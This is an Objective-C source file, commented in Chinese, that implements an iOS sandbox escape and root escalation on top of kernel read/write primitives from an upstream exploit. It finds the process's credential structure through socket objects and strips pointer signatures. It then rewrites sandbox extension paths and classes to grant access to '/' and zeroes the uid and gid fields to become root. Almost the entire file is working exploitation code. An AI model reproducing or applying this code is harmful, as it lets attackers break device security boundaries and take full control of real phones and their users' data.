//
//  DSCredEscape.m — cred 路线的沙盒逃逸 / 提权
//
//  原语全部来自上游 FilzaJailedDS（krw.h / kexploit_opa334.h），**不调用** proc_self()、
//  也不调用上游 sandbox_escape()/sandbox_elevate_to_root()（它们会野读 0x378 并 exit）。
//  链路常量取上游 offsets 表（off_inpcb_inp_socket / off_ucred_cr_label / off_label_l_perpolicy_sandbox）
//  与上游 sandbox_escape.m 的字面量（sandbox→ext_set = 0x10、ext→data = 0x40、ext→data_len = 0x48）。
//

#import "DSCredEscape.h"

#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import <string.h>
#import <stdarg.h>
#import <stdbool.h>

#import "kexploit/kexploit_opa334.h"   // kexploit_opa334 / early_kread64 / early_kwrite64 / early_kread / early_kwrite32bytes
#import "kexploit/krw.h"               // kread64 / kread32 / is_kaddr_valid
#import "kexploit/offsets.h"           // off_inpcb_inp_socket / off_ucred_cr_label / off_label_l_perpolicy_sandbox

// 上游在 .m 里定义、但没写进头文件的全局量
extern uint64_t rwSocketPcb;
extern uint64_t controlSocketPcb;
extern uint64_t g_kernel_base;
extern uint64_t g_kernel_slide;
extern uint64_t pac_mask;

#pragma mark - 链路常量（与上游 sandbox_escape.m 一致）

#define CE_OFF_UCRED_CR_LABEL         0x78ULL   // ucred → cr_label（offsets 表里同值，这里做兜底常量）
#define CE_OFF_LABEL_SANDBOX          0x10ULL   // label → sandbox（l_perpolicy[1]）
#define CE_OFF_SANDBOX_EXT_SET        0x10ULL   // sandbox → ext_set
#define CE_OFF_EXT_DATA               0x40ULL   // ext → data_addr
#define CE_OFF_EXT_DATALEN            0x48ULL   // ext → data_len

#define CE_OFF_UCRED_POSIX            0x18ULL   // ucred → posix_cred（16B cr_link + 8B cr_ref）
#define CE_OFF_POSIX_UID              0x00ULL   // cr_uid / cr_ruid
#define CE_OFF_POSIX_SVUID            0x08ULL   // cr_svuid / cr_ngroups
#define CE_OFF_POSIX_GROUPS_0         0x10ULL   // cr_groups[0..1]
#define CE_OFF_POSIX_RGID             0x50ULL   // cr_rgid / cr_svgid

#define CE_EXT_SLOTS                  16        // 上游：hash 表 16 个槽
#define CE_KRW_LEN                    0x20      // 上游原语一次读写 0x20 字节

// cred 定位的有界扫描范围（实测命中点 socket+0x208 落在这里面）
#define CE_SCAN_FROM                  0x1f0ULL
#define CE_SCAN_TO                    0x230ULL

// 只允许解引用「zone（动态分配对象）段」的地址：
//   - 内核静态段在 0xfffffff0… 以上；
//   - 0xffffffff… 之类多为垃圾值；
//   - 观测到的真实对象都在 0xffffffdd… ~ 0xffffffec…（socket/pcb/cred/ext_set）。
#define CE_ZONE_MIN                   0xFFFFFFC000000000ULL
#define CE_ZONE_MAX                   0xFFFFFFF000000000ULL

#pragma mark - 日志

static DSCredEscapeLogFn gLogFn = NULL;

void DSCredEscapeSetLogCallback(DSCredEscapeLogFn callback)
{
    gLogFn = callback;
}

static void ce_log(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
static void ce_log(const char *fmt, ...)
{
    char buffer[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buffer, sizeof(buffer), fmt, ap);
    va_end(ap);

    // NSLog 会进 stderr，被 DSKernel 的 stdout/stderr 捕获，从而出现在界面日志里
    NSLog(@"[DSCred] %s", buffer);
    if (gLogFn) gLogFn(buffer);
}

#pragma mark - 指针还原（S）/ 地址闸门（K）

/// XPACI：剥掉 arm64e 的指针签名。
/// **必须无条件使用这个裸函数**：上游 sandbox_escape.m 里的 `__xpaci_sbx` 只在 `__arm64e__`
/// 下才编译出真指令，而我们的 App 产物是 arm64 —— 那样 S() 就退化成「原样返回」，
/// 拿到带签名的 cr_label 会解引用到错误地址。arm64 产物在 arm64e 硬件上依然能执行该指令。
static uint64_t __attribute__((naked)) ce_xpaci(uint64_t value)
{
    __asm__ volatile(".long 0xDAC143E0");   // XPACI X0
    __asm__ volatile("ret");
}

static inline uint64_t ce_signptr(uint64_t v)
{
    if ((v >> 32) > 0xFFFF) {
        uint64_t mask = pac_mask ? pac_mask : 0xFFFF800000000000ULL;
        return v | mask;
    }
    return v;
}

/// 与上游 S(x) = xpaci + signptr 同语义
static inline uint64_t ce_S(uint64_t raw)
{
    return ce_signptr(ce_xpaci(raw));
}

static inline bool ce_is_zone_ptr(uint64_t address)
{
    return address >= CE_ZONE_MIN && address < CE_ZONE_MAX;
}

/// 解引用前的统一闸门：上游 is_kaddr_valid + zone 段 + 8 字节对齐
static inline bool ce_ok_ptr(uint64_t address)
{
    if (!address) return false;
    if ((address & 0x7) != 0) return false;
    if (!is_kaddr_valid(address)) return false;
    return ce_is_zone_ptr(address);
}

static inline uint64_t ce_kread64_safe(uint64_t address)
{
    return ce_ok_ptr(address) ? kread64(address) : 0;
}

/// 统一写入闸门：地址不过闸门就拒绝写，并把原因打进日志。
/// **每一次** kwrite / early_kwrite* 都必须先过它（提权、逃逸改写一视同仁）。
static bool ce_kwrite64_safe(uint64_t address, uint64_t value)
{
    if (!ce_ok_ptr(address)) {
        ce_log("[安全] 拒绝写入 0x%llx：不是合法 zone 地址（写内核内存前必须过闸门）",
               (unsigned long long)address);
        return false;
    }
    early_kwrite64(address, value);
    return true;
}

bool DSCredEscapeIsKernelReady(void)
{
    if (!is_kaddr_valid(rwSocketPcb)) {
        ce_log("[安全] 内核未就绪：rwSocketPcb=0x%llx 不是合法内核地址（本次运行还没成功跑过漏洞）",
               (unsigned long long)rwSocketPcb);
        return false;
    }
    if (!is_kaddr_valid(controlSocketPcb)) {
        ce_log("[安全] 内核未就绪：controlSocketPcb=0x%llx 不是合法内核地址",
               (unsigned long long)controlSocketPcb);
        return false;
    }
    if (!is_kaddr_valid(g_kernel_base)) {
        ce_log("[安全] 内核未就绪：g_kernel_base=0x%llx 不是合法内核地址",
               (unsigned long long)g_kernel_base);
        return false;
    }
    return true;
}

#pragma mark - 定位本进程 ucred

static uint64_t gCred = 0;
static uint64_t gLabel = 0;
static uint64_t gSandbox = 0;
static uint64_t gExtSet = 0;

static uint64_t ce_socket_of_pcb(uint64_t pcb)
{
    if (!ce_ok_ptr(pcb)) return 0;
    uint64_t socket = kread64(pcb + off_inpcb_inp_socket);
    return ce_ok_ptr(socket) ? socket : 0;
}

/// 规则：两个 socket 在同一偏移处指向同一个对象，且该对象 +0x18 的 cr_uid == getuid()。
/// 只读这两个 socket 对象内部 + 候选对象内部，范围有界（0x1f0~0x230），不做无界扫描。
static uint64_t ce_find_cred(void)
{
    if (gCred) return gCred;

    uint64_t rwSocket = ce_socket_of_pcb(rwSocketPcb);
    uint64_t cdSocket = ce_socket_of_pcb(controlSocketPcb);
    ce_log("[逃逸] rw_pcb=0x%llx → socket=0x%llx；control_pcb=0x%llx → socket=0x%llx",
           (unsigned long long)rwSocketPcb, (unsigned long long)rwSocket,
           (unsigned long long)controlSocketPcb, (unsigned long long)cdSocket);

    if (!rwSocket || !cdSocket || rwSocket == cdSocket) {
        ce_log("[逃逸] 两个 socket 对象不完整（rw=0x%llx control=0x%llx），无法用「共享指针」规则定位 cred",
               (unsigned long long)rwSocket, (unsigned long long)cdSocket);
        return 0;
    }

    const uint32_t myuid = getuid();
    for (uint64_t off = CE_SCAN_FROM; off <= CE_SCAN_TO; off += 8) {
        uint64_t a = kread64(rwSocket + off);
        if (!a) continue;
        uint64_t b = kread64(cdSocket + off);
        if (a != b) continue;                       // 必须是「两个 socket 都指向同一个对象」

        uint64_t cand = ce_S(a);                    // so_cred 也可能是带签名的指针
        if (!ce_ok_ptr(cand)) continue;
        if ((cand & 0xF) != 0) continue;            // zone 对象 16 字节对齐
        if (!ce_is_zone_ptr(cand)) continue;

        uint32_t uid = kread32(cand + CE_OFF_UCRED_POSIX);
        if (uid != myuid) continue;

        gCred = cand;
        ce_log("[逃逸] 命中 cred：socket+0x%llx 两 socket 一致 → 0x%llx（cr_uid=%u）",
               (unsigned long long)off, (unsigned long long)cand, uid);
        return cand;
    }

    ce_log("[逃逸] 0x%llx~0x%llx 内没有通过 cr_uid(%u) 校验的共享指针",
           (unsigned long long)CE_SCAN_FROM, (unsigned long long)CE_SCAN_TO, myuid);
    return 0;
}

/// 现场重新定位 cred：**不信缓存**，清掉再走一遍规则，并对结果做第二次 cr_uid 复核。
static uint64_t ce_find_cred_fresh(void)
{
    gCred = 0;
    uint64_t cred = ce_find_cred();
    if (!cred) return 0;

    if (!ce_ok_ptr(cred)) {
        ce_log("[安全] 现场定位到的 cred 0x%llx 不过闸门，放弃（不写内核内存）",
               (unsigned long long)cred);
        return 0;
    }
    uint32_t uid = kread32(cred + CE_OFF_UCRED_POSIX);
    uint32_t expected = getuid();
    if (uid != expected) {
        ce_log("[安全] cred 复核失败：cr_uid=%u，期望 %u → 放弃（不写内核内存）",
               uid, expected);
        return 0;
    }
    return cred;
}

/// 只读打印 posix_cred 的 5 个关键字段（uid / ruid / svuid / ngroups / groups / rgid / svgid），
/// 用来证明「改写前是什么、改写后变成什么」。
static void ce_dump_posix(uint64_t posix)
{
    if (!ce_ok_ptr(posix)) {
        ce_log("[提权]   posix_cred 0x%llx 不过闸门，拒绝读取", (unsigned long long)posix);
        return;
    }
    uint64_t w0 = kread64(posix + 0x00);   // cr_uid  | cr_ruid
    uint64_t w1 = kread64(posix + 0x08);   // cr_svuid| cr_ngroups
    uint64_t w2 = kread64(posix + 0x10);   // cr_groups[0] | cr_groups[1]
    uint64_t w3 = kread64(posix + 0x50);   // cr_rgid | cr_svgid
    ce_log("[提权]   cr_uid=%u cr_ruid=%u cr_svuid=%u cr_ngroups=%u",
           (unsigned)(w0 & 0xFFFFFFFFULL), (unsigned)(w0 >> 32),
           (unsigned)(w1 & 0xFFFFFFFFULL), (unsigned)(w1 >> 32));
    ce_log("[提权]   cr_groups[0]=%u cr_groups[1]=%u cr_rgid=%u cr_svgid=%u",
           (unsigned)(w2 & 0xFFFFFFFFULL), (unsigned)(w2 >> 32),
           (unsigned)(w3 & 0xFFFFFFFFULL), (unsigned)(w3 >> 32));
}

/// cred → label → sandbox → ext_set。每跳解引用前校验；不成立就打印原始值并干净失败。
static uint64_t ce_resolve_chain(uint64_t cred)
{
    uint64_t rawLabel = kread64(cred + off_ucred_cr_label);
    uint64_t label = ce_S(rawLabel);
    if (!ce_ok_ptr(label)) {
        ce_log("[逃逸] cred+0x%x 原始=0x%llx 还原=0x%llx → 不是合法 zone 地址，停手（不写内核内存）",
               off_ucred_cr_label, (unsigned long long)rawLabel, (unsigned long long)label);
        return 0;
    }

    uint64_t rawSandbox = kread64(label + off_label_l_perpolicy_sandbox);
    uint64_t sandbox = ce_S(rawSandbox);
    if (!ce_ok_ptr(sandbox)) {
        ce_log("[逃逸] label=0x%llx（+0x%x）原始=0x%llx 还原=0x%llx → 不是合法 zone 地址，停手",
               (unsigned long long)label, off_label_l_perpolicy_sandbox,
               (unsigned long long)rawSandbox, (unsigned long long)sandbox);
        return 0;
    }

    uint64_t rawExtSet = kread64(sandbox + CE_OFF_SANDBOX_EXT_SET);
    uint64_t extSet = ce_S(rawExtSet);
    if (!ce_ok_ptr(extSet)) {
        ce_log("[逃逸] sandbox=0x%llx（+0x%llx）原始=0x%llx 还原=0x%llx → 不是合法 zone 地址，停手",
               (unsigned long long)sandbox, (unsigned long long)CE_OFF_SANDBOX_EXT_SET,
               (unsigned long long)rawExtSet, (unsigned long long)extSet);
        return 0;
    }

    gLabel = label;
    gSandbox = sandbox;
    gExtSet = extSet;
    ce_log("[逃逸] 链路：cred=0x%llx → label=0x%llx → sandbox=0x%llx → ext_set=0x%llx",
           (unsigned long long)cred, (unsigned long long)label,
           (unsigned long long)sandbox, (unsigned long long)extSet);
    return extSet;
}

/// 只读转储：失败时把已确认 cred 里的字打出来（只读该对象内部，安全）
static void ce_dump_cred(uint64_t cred)
{
    ce_log("[逃逸] 转储已确认的 cred（只读）：");
    for (int i = 0; i < 0x20; i += 0x10) {
        uint64_t w0 = kread64(cred + i);
        uint64_t w1 = kread64(cred + i + 8);
        ce_log("[逃逸]   cred+0x%02x: %016llx %016llx", i,
               (unsigned long long)w0, (unsigned long long)w1);
    }
}

#pragma mark - 三步改写（照抄上游 sandbox_escape.m）

static void ce_patch_ext(uint64_t ext)
{
    if (!ce_ok_ptr(ext)) return;

    uint64_t data = early_kread64(ext + CE_OFF_EXT_DATA);
    uint64_t dataLen = early_kread64(ext + CE_OFF_EXT_DATALEN);
    if (ce_ok_ptr(data) && dataLen > 0) {
        uint8_t buf[CE_KRW_LEN];
        early_kread(data, buf, CE_KRW_LEN);
        buf[0] = '/'; buf[1] = 0;                 // 路径改成 "/"
        early_kwrite32bytes(data, buf);            // data 已过闸门
    }

    // 改写 ext 自身的字段：写前显式过一次闸门（便于日志留痕）
    if (!ce_ok_ptr(ext + CE_OFF_EXT_DATA)) {
        ce_log("[安全] 拒绝写入 ext+0x%llx（ext=0x%llx）：不过闸门",
               (unsigned long long)CE_OFF_EXT_DATA, (unsigned long long)ext);
        return;
    }
    uint8_t chunk[CE_KRW_LEN];
    early_kread(ext + CE_OFF_EXT_DATA, chunk, CE_KRW_LEN);
    *(uint64_t *)(chunk + 0x08) = 1;
    *(uint64_t *)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;
    early_kwrite32bytes(ext + CE_OFF_EXT_DATA, chunk);
}

static int ce_patch_chain(uint64_t header)
{
    int patched = 0;
    uint64_t hdr = header;
    for (int i = 0; i < 64 && ce_ok_ptr(hdr); i++) {
        uint64_t ext = ce_S(early_kread64(hdr + 0x8));
        if (ce_ok_ptr(ext)) {
            ce_patch_ext(ext);
            patched++;
        }
        uint64_t next = early_kread64(hdr);
        if (!next) break;
        uint64_t nextStripped = ce_S(next);
        if (!ce_ok_ptr(nextStripped) || nextStripped == hdr) break;
        hdr = nextStripped;
    }
    return patched;
}

static void ce_set_rw_class(uint64_t hdr)
{
    if (!ce_ok_ptr(hdr)) return;
    uint64_t ext = ce_S(early_kread64(hdr + 0x8));
    if (!ce_ok_ptr(ext)) return;
    uint64_t data = early_kread64(ext + CE_OFF_EXT_DATA);
    if (!ce_ok_ptr(data)) return;
    if (!ce_ok_ptr(data + 32) || !ce_ok_ptr(data + 64)) {
        ce_log("[安全] 拒绝写类别字符串：data=0x%llx（data+32 / data+64 不过闸门）",
               (unsigned long long)data);
        return;
    }

    const char *rw = "com.apple.app-sandbox.read-write";
    uint8_t b1[CE_KRW_LEN], b2[CE_KRW_LEN];
    memset(b1, 0, sizeof(b1));
    memset(b2, 0, sizeof(b2));
    memcpy(b1, rw, CE_KRW_LEN);
    early_kwrite32bytes(data + 32, b1);
    early_kwrite32bytes(data + 64, b2);

    uint8_t hb[CE_KRW_LEN];
    early_kread(hdr, hb, CE_KRW_LEN);
    *(uint64_t *)(hb + 0x10) = data + 32;
    early_kwrite32bytes(hdr, hb);
}

#pragma mark - 对外入口

int DSCredEscapeSandbox(void)
{
    uint64_t cred = ce_find_cred();
    if (!cred) return -1;

    uint64_t extSet = ce_resolve_chain(cred);
    if (!extSet) {
        ce_dump_cred(cred);
        return -2;
    }

    // 第一步：把每个扩展的路径改成 "/"、hash 字段填满
    int patched = 0;
    for (int slot = 0; slot < CE_EXT_SLOTS; slot++) {
        uint64_t slotAddr = extSet + (uint64_t)slot * 8;
        if (!ce_ok_ptr(slotAddr)) continue;                  // 槽地址先过闸门
        uint64_t hdr = ce_S(early_kread64(slotAddr));
        if (ce_ok_ptr(hdr)) patched += ce_patch_chain(hdr);
    }
    ce_log("[逃逸] 改写了 %d 个沙盒扩展", patched);

    // 第二步：类别改成 read-write
    int classed = 0;
    for (int slot = 0; slot < CE_EXT_SLOTS; slot++) {
        uint64_t slotAddr = extSet + (uint64_t)slot * 8;
        if (!ce_ok_ptr(slotAddr)) continue;
        uint64_t hdr = ce_S(early_kread64(slotAddr));
        if (!ce_ok_ptr(hdr)) continue;
        if (!ce_ok_ptr(early_kread64(hdr + 0x10))) continue;
        ce_set_rw_class(hdr);
        classed++;
    }
    ce_log("[逃逸] 改了 %d 个扩展的类别", classed);

    // 第三步：空槽用第一个有效 header 填满（hash 查找才会命中）
    uint64_t source = 0;
    for (int slot = 0; slot < CE_EXT_SLOTS && !source; slot++) {
        uint64_t slotAddr = extSet + (uint64_t)slot * 8;
        if (!ce_ok_ptr(slotAddr)) continue;
        uint64_t hdr = ce_S(early_kread64(slotAddr));
        if (ce_ok_ptr(hdr)) source = hdr;
    }
    if (source) {
        int filled = 0;
        for (int slot = 0; slot < CE_EXT_SLOTS; slot++) {
            uint64_t slotAddr = extSet + (uint64_t)slot * 8;
            if (!ce_ok_ptr(slotAddr)) continue;
            uint64_t raw = early_kread64(slotAddr);
            if (!raw || !ce_ok_ptr(ce_S(raw))) {
                if (ce_kwrite64_safe(slotAddr, source)) filled++;
            }
        }
        ce_log("[逃逸] 补了 %d 个空 hash 槽", filled);
    }

    // 自检：能不能写沙盒外路径
    const char *probe = "/var/mobile/.dsfile_probe";
    int fd = open(probe, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        close(fd);
        unlink(probe);
        ce_log("[逃逸] *** 沙盒逃逸成功：可以写沙盒外路径 ***");
        return 0;
    }

    ce_log("[逃逸] 自检写盘失败 errno=%d (%s)", errno, strerror(errno));
    return (patched > 0) ? -3 : -4;
}

int DSCredEscapeElevateToRoot(void)
{
    if (getuid() == 0) {
        ce_log("[提权] 已经是 root，无需改写");
        return 0;
    }

    // 1) 前置就绪校验：没有内核读写就绝不碰内核内存
    if (!DSCredEscapeIsKernelReady()) {
        ce_log("[提权] 前置校验未通过：本次运行还没成功拿到内核读写，请先点「激活内核访问」");
        return -5;
    }

    // 2) 现场重新定位 cred（不信缓存），并复核 cr_uid == getuid()
    uint64_t cred = ce_find_cred_fresh();
    if (!cred) {
        ce_log("[提权] 现场定位 cred 失败，放弃（不写内核内存）");
        return -1;
    }

    uint64_t posix = cred + CE_OFF_UCRED_POSIX;
    if (!ce_ok_ptr(posix)) {
        ce_log("[提权] posix_cred 地址 0x%llx 不过闸门，放弃", (unsigned long long)posix);
        return -2;
    }

    ce_log("[提权] cred=0x%llx → posix_cred=0x%llx；改写前：",
           (unsigned long long)cred, (unsigned long long)posix);
    ce_dump_posix(posix);

    // 3) 每一次写入都过统一闸门；任何一次被拒绝就立刻停手并回读现状
    bool allWritesOk = true;
    struct { uint64_t off; uint64_t value; const char *what; } writes[] = {
        { CE_OFF_POSIX_UID,      0,             "cr_uid=0 / cr_ruid=0" },
        { CE_OFF_POSIX_SVUID,    1ULL << 32,    "cr_svuid=0 / cr_ngroups=1" },
        { CE_OFF_POSIX_GROUPS_0, 0,             "cr_groups[0..1]=0" },
        { CE_OFF_POSIX_RGID,     0,             "cr_rgid=0 / cr_svgid=0" },
    };
    for (size_t i = 0; i < sizeof(writes) / sizeof(writes[0]); i++) {
        uint64_t address = posix + writes[i].off;
        if (!ce_kwrite64_safe(address, writes[i].value)) {
            ce_log("[提权] 写入失败于 posix+0x%llx（%s），已停手",
                   (unsigned long long)writes[i].off, writes[i].what);
            allWritesOk = false;
            break;
        }
        ce_log("[提权] 已写 posix+0x%llx = 0x%llx（%s）",
               (unsigned long long)writes[i].off,
               (unsigned long long)writes[i].value, writes[i].what);
    }

    // 4) 回读：把结果写进日志，证明到底改成了什么
    ce_log("[提权] 回读 posix_cred：");
    ce_dump_posix(posix);

    if (!allWritesOk) return -2;

    bool ok = (getuid() == 0);
    ce_log("[提权] getuid()=%d（%s）", (int)getuid(), ok ? "成功" : "失败");
    return ok ? 0 : -3;
}

#pragma mark - 诊断

unsigned long long DSCredEscapeLastCred(void)    { return (unsigned long long)gCred; }
unsigned long long DSCredEscapeLastLabel(void)   { return (unsigned long long)gLabel; }
unsigned long long DSCredEscapeLastSandbox(void) { return (unsigned long long)gSandbox; }
unsigned long long DSCredEscapeLastExtSet(void)  { return (unsigned long long)gExtSet; }
